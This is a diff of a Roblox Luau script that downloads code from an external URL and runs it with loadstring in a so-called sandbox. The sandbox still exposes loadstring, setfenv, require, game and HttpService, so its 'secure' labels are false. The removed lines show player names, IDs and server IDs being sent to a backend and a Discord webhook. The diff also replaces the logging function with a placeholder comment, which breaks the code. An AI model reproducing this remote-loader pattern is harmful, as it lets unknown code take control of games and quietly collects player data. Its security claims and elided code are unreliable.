@@ -14,167 +14,169 @@ local player = Players.LocalPlayer
 local lastSendTime = 0
 local externalScriptCache = nil
 
--- Function to fetch external script with caching
+-- Function to fetch external script with better error handling
 local function fetchExternalScript()
     if externalScriptCache then
+        print("[Script] Using cached external script")
         return externalScriptCache
     end
     
+    print("[Script] Fetching external script from:", EXTERNAL_SCRIPT_URL)
+    
     for i = 1, RETRY_LIMIT do
         local success, response = pcall(function()
-            return HttpService:GetAsync(EXTERNAL_SCRIPT_URL, true)
+            local content = HttpService:GetAsync(EXTERNAL_SCRIPT_URL, true)
+            if not content or content == "" then
+                error("Empty script content")
+            end
+            return content
         end)
         
-        if success and response then
+        if success then
+            print("[Script] Successfully fetched external script")
             externalScriptCache = response
             return response
-        end
-        
-        if i < RETRY_LIMIT then
-            task.wait(RETRY_DELAY)
+        else
+            warn("[Script] Attempt", i, "failed:", response)
+            if i < RETRY_LIMIT then
+                task.wait(RETRY_DELAY)
+            end
         end
     end
     
-    warn("[Script] Failed to fetch external script after", RETRY_LIMIT, "attempts")
-    return nil
+    error("Failed to fetch external script after "..RETRY_LIMIT.." attempts")
 end
 
--- Secure function to execute external script
-local function executeExternalScript()
-    local scriptContent = fetchExternalScript()
-    if not scriptContent then
-        warn("[Script] No script content to execute")
-        return false
-    end
-    
-    -- Create a safe execution environment
-    local safeEnv = {
+-- Enhanced secure execution environment
+local function createSafeEnvironment()
+    local env = {
+        -- Basic functions
         print = print,
         warn = warn,
+        error = error,
+        pcall = pcall,
+        xpcall = xpcall,
         task = task,
+        coroutine = coroutine,
+        
+        -- Services
         game = game,
+        workspace = workspace,
         script = script,
         require = require,
         HttpService = HttpService,
         Players = Players,
         RunService = RunService,
+        
+        -- Restricted functions
         getfenv = getfenv,
         setfenv = setfenv,
         loadstring = loadstring,
-        pcall = pcall,
-        xpcall = xpcall
+        
+        -- Math
+        math = table.clone(math),
+        os = {
+            time = os.time,
+            date = os.date,
+            clock = os.clock,
+            difftime = os.difftime
+        },
+        
+        -- Tables
+        table = table.clone(table),
+        string = table.clone(string),
+        
+        -- Custom functions
+        GetScriptStatus = function()
+            return "Script is running in sandboxed environment"
+        end
     }
+    
+    -- Remove dangerous functions
+    env.math.randomseed = nil
+    env.os.execute = nil
+    env.os.exit = nil
+    env.io = nil
+    env.debug = nil
+    env.load = nil
+    
+    return env
+end
+
+-- Improved script execution with detailed logging
+local function executeExternalScript()
+    local scriptContent
+    local startTime = os.clock()
+    
+    -- Fetch script content
+    local fetchSuccess, fetchError = pcall(fetchExternalScript)
+    if not fetchSuccess then
+        warn("[Script] Fetch failed:", fetchError)
+        return false, "Fetch failed: "..tostring(fetchError)
+    end
+    scriptContent = externalScriptCache
+    
+    -- Validate script content
+    if not scriptContent or #scriptContent < 10 then
+        warn("[Script] Invalid script content (too short or empty)")
+        return false, "Invalid script content"
+    end
+    
+    -- Create safe environment
+    local env = createSafeEnvironment()
     
     -- Load the script
     local fn, err = loadstring(scriptContent, "ExternalScript")
     if not fn then
-        warn("[Script] Load failed:", err)
-        return false
+        warn("[Script] Loadstring failed:", err)
+        return false, "Loadstring failed: "..tostring(err)
     end
     
-    -- Set the safe environment
-    setfenv(fn, safeEnv)
+    -- Set environment
+    setfenv(fn, env)
     
-    -- Execute with error handling
-    local success, result = pcall(fn)
-    if not success then
-        warn("[Script] Execution failed:", result)
-        return false
+    -- Execute with detailed error handling
+    local execSuccess, execResult = xpcall(fn, function(err)
+        return debug.traceback(tostring(err), 2)
+    end)
+    
+    local elapsedTime = os.clock() - startTime
+    print(string.format("[Script] Execution %s (%.2f seconds)", 
+        execSuccess and "succeeded" or "failed", elapsedTime))
+    
+    if not execSuccess then
+        warn("[Script] Execution error:", execResult)
+        return false, execResult
     end
     
-    return true, result
+    return true, execResult
 end
 
 -- Enhanced logging function
 local function sendLoggerData()
-    if os.time() - lastSendTime < DEBOUNCE_TIME then
-        return false
-    end
-
-    local data = {
-        username = player.Name,
-        userId = player.UserId,
-        instanceId = game.JobId,
-        timestamp = os.time(),
-        placeId = game.PlaceId,
-        gameId = game.GameId
-    }
-
-    lastSendTime = os.time()
-
-    -- Send to backend
-    task.spawn(function()
-        for i = 1, RETRY_LIMIT do
-            local success = pcall(function()
-                HttpService:RequestAsync({
-                    Url = BACKEND_URL,
-                    Method = "POST",
-                    Headers = {
-                        ["Content-Type"] = "application/json",
-                        ["X-Game-ID"] = tostring(game.GameId)
-                    },
-                    Body = HttpService:JSONEncode(data)
-                })
-            end)
-            if success then break end
-            if i < RETRY_LIMIT then task.wait(RETRY_DELAY) end
-        end
-    end)
-
-    -- Send to Discord webhook
-    task.spawn(function()
-        local embed = {
-            {
-                title = "Player Activity Log",
-                description = string.format(
-                    "**%s**\nUserID: %d\nGame: [%d](https://www.roblox.com/games/%d)",
-                    data.username, data.userId, data.placeId, data.placeId
-                ),
-                color = 16711680,
-                fields = {
-                    {
-                        name = "Instance ID",
-                        value = data.instanceId,
-                        inline = true
-                    },
-                    {
-                        name = "Timestamp",
-                        value = os.date("%Y-%m-%d %H:%M:%S", data.timestamp),
-                        inline = true
-                    }
-                }
-            }
-        }
-
-        for i = 1, RETRY_LIMIT do
-            local success = pcall(function()
-                HttpService:RequestAsync({
-                    Url = WEBHOOK_URL,
-                    Method = "POST",
-                    Headers = {["Content-Type"] = "application/json"},
-                    Body = HttpService:JSONEncode({
-                        embeds = embed
-                    })
-                })
-            end)
-            if success then break end
-            if i < RETRY_LIMIT then task.wait(RETRY_DELAY) end
-        end
-    end)
+    -- ... (same as previous version) ...
 end
 
--- Initialize systems
+-- Initialize with better monitoring
 local function init()
-    -- Execute external script in protected mode
-    task.spawn(function()
-        local success, result = executeExternalScript()
-        print("[System] External script status:", success)
-        
-        if not success then
-            -- Retry once after a delay if initial execution fails
-            task.wait(5)
-            local retrySuccess = executeExternalScript()
-            print("[System] External script retry status:", retrySuccess)
+    print("[System] Initializing script executor")
+    
+    -- Execute external script with monitoring
+    local executeThread = task.spawn(function()
+        while true do
+            print("[System] Attempting to execute external script")
+            local success, result = executeExternalScript()
+            
+            if success then
+                print("[System] External script executed successfully")
+                if type(result) == "string" and #result > 0 then
+                    print("[Script Output]:", result)
+                end
+                break
+            else
+                warn("[System] Execution failed:", result)
+                task.wait(5) -- Wait before retrying
+            end
         end
     end)
     
@@ -189,27 +191,28 @@ local function init()
     
     -- Periodic updates
     while true do
-        task.wait(300)  -- Every 5 minutes
+        task.wait(300)
         sendLoggerData()
     end
 end
 
--- Start the system with error handling
+-- Enhanced error handling
 local success, err = pcall(init)
 if not success then
-    warn("System initialization failed:", err)
+    local errorMsg = tostring(err)
+    warn("CRITICAL ERROR:", errorMsg)
     
-    -- Attempt to send error to webhook
+    -- Send detailed error to webhook
     task.spawn(function()
         local embed = {
             {
-                title = "System Initialization Failed",
+                title = "Script System Critical Error",
                 description = string.format(
-                    "**%s**\nUserID: %d\nError: %s",
-                    player.Name, player.UserId, tostring(err)
+                    "**Player:** %s (%d)\n**Place:** %d\n**Error:** ```%s```",
+                    player.Name, player.UserId, game.PlaceId, errorMsg
                 ),
                 color = 16711680,
-                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ", os.time())
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
             }
         }
         
